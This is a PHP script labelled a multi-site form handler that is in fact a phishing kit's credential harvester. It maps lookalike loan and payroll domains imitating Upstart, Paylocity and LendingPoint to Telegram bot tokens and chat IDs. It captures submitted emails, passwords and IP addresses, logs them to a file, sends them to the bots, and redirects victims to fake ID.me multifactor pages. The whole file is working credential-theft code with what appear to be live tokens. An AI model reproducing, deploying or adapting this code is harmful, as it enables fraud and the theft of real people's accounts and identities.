<?php
// =========================================
// 🌐 UNIVERSAL MULTI-SITE FORM HANDLER
// ✅ Using HTTP_REFERER to detect form source domain
// =========================================


// === Configuration: Replace with real domains ===
$site_map = [
    'upstartloan.rf.gd' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '7693363714:AAGyvBsKoR1ML6OwqcuBAW2aIEwiYzamw4M', 'chat_id' => '6108491247']
        ],
        'redirect' => 'https://upstartloan.rf.gd/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php'
    ],

    'thepaylocity.rf.gd' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '7603786731:AAEPbaOXWK9DGtTTH3ZXMoTueem5OSY8uBA', 'chat_id' => '8084520583']
        ],
        'redirect' => 'https://thepaylocity.rf.gd/cache_site/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php'
    ],
    
    'lendingpoint.ct.ws' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '6304581861:AAGcg6NEHDa53yh9gIr_744so-hVPB-nFxk', 'chat_id' => '5539028238']

        ],
        'redirect' => 'https://lendingpoint.ct.ws/cache_site/lendingpoint/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php'
    ],


    'upstart-loans.42web.io' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '7611371083:AAE31mneMfDJYHNN_TidWJxfXV_2mV6kAVY', 'chat_id' => '7950407416']

        ],
        'redirect' => 'https://upstart-loans.42web.io/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php'
    ],
    'upstart-loans.wuaze.com' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '7956417008:AAE_AajDMFr5uyaWrObRwXSRCsXXDeAlBuQ', 'chat_id' => '1566821522']

        ],
        'redirect' => 'https://upstart-loans.wuaze.com/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php'
    ],
    'upstartloans.rf.gd' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '7829342178:AAG7bSD5-XY5pgg3XO0ynfVytz87oIwasZQ', 'chat_id' => '1566821522']

        ],
        'redirect' => 'https://upstartloans.rf.gd/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php'
    ],
    // Add more sites...
];


$log_file = 'submission_log.txt';

// === Logging Function ===
function logToFile($data, $file) {
    $entry = "[" . date("Y-m-d H:i:s") . "] " . $data . "\n";
    file_put_contents($file, $entry, FILE_APPEND);
}

// === Telegram Sender ===
function sendToBots($message, $bots) {
    foreach ($bots as $bot) {
        $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
        $data = [
            'chat_id' => $bot['chat_id'],
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_RETURNTRANSFER => true
        ]);
        curl_exec($ch);
        curl_close($ch);
    }
}

// === Main Logic ===
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Use HTTP_REFERER to determine where the form was hosted
    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    $parsed  = parse_url($referer);
    $domain  = $parsed['host'] ?? 'unknown-origin';

    $useremail    = htmlspecialchars($_POST['useremail'] ?? 'Unknown');
    $userpassword = htmlspecialchars($_POST['userpassword'] ?? 'Empty');
    $ip = htmlspecialchars($_POST['ip'] ?? 'No ip');
    $timestamp    = date("Y-m-d H:i:s");

    $msg = "📝 *New Submission from $domain*\n\n".
           "👤 *Email:* $useremail\n".
           "🔑 *Password:* $userpassword\n".
           "🌐 *IP:* $ip\n".
           "⏰ *Time:* $timestamp";

    logToFile("[$domain] $useremail | $userpassword | $ip", $log_file);

    if (isset($site_map[$domain])) {
        $site_config = $site_map[$domain];
        sendToBots($msg, $site_config['bots']);
        header("Location: " . $site_config['redirect']);
        exit;
    } else {
        logToFile("❌ Unauthorized domain: $domain", $log_file);
        exit("Unauthorized domain");
    }
}
?>
